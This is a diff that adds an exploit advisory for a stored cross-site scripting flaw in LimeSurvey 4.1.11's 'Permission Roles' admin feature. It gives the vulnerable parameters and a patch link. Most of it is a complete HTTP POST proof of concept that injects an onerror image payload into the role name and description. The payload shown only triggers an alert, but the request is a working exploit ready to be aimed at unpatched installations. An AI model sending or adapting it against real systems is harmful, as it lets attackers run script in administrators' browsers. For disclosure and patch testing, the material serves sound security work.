@@ -1,0 +1,33 @@
+# Exploit Title: LimeSurvey 4.1.11 - 'Permission Roles' Persistent Cross-Site Scripting 
+# Date: 05/26/2020
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://www.limesurvey.org
+# Version: LimeSurvey 4.1.11+200316
+# Tested on: Ubuntu 18.04.4
+# Patch Link: https://github.com/LimeSurvey/LimeSurvey/commit/2aada33c76efbbc35d33c149ac02b1dc16a81f62
+
+
+# Vulnerability Details
+Description : A stored cross-site scripting vulnerability exists within the "Permission Roles" functionality of the LimeSurvey administration panel.
+Vulnerable Parameters : Permissiontemplates[name], Permissiontemplates[description]
+
+
+# POC
+# Exploit Details : The following request will create a permission role with an XSS payload as the role name and description.  
+
+
+POST /limesurvey/index.php/admin/roles/sa/applyedit HTTP/1.1
+Host: TARGET
+Content-Length: 443
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://TARGET
+Referer: http://TARGET/limesurvey/index.php/admin/roles
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: YII_CSRF_TOKEN=RWc3emx-NVhlfm1xamJhRkVSWGlkc1lRfmR5U0RRalYzu7h7NfgUoNTY6kMmTkPkB3J0_IsbOQQEMfsWGmt0Pg%3D%3D; LS-ERXSBPYJOOGIGFYW=m4qshhf7m76ifsm6k0v1vq084h
+Connection: close
+
+YII_CSRF_TOKEN=RWc3emx-NVhlfm1xamJhRkVSWGlkc1lRfmR5U0RRalYzu7h7NfgUoNTY6kMmTkPkB3J0_IsbOQQEMfsWGmt0Pg%3D%3D&Permissiontemplates%5Bptid%5D=&Permissiontemplates%5Bname%5D=%3Cimg+src%3D%2F+onerror%3Dalert(1)%3E&Permissiontemplates%5Bdescription%5D=%3Cimg+src%3D%2F+onerror%3Dalert(1)%3E&Permissiontemplates%5Brenewed_last%5D=2020-03-31+17%3A51%3A02&Permissiontemplates%5Bcreated_at%5D=2020-03-31+17%3A51%3A02&Permissiontemplates%5Bcreated_by%5D=1
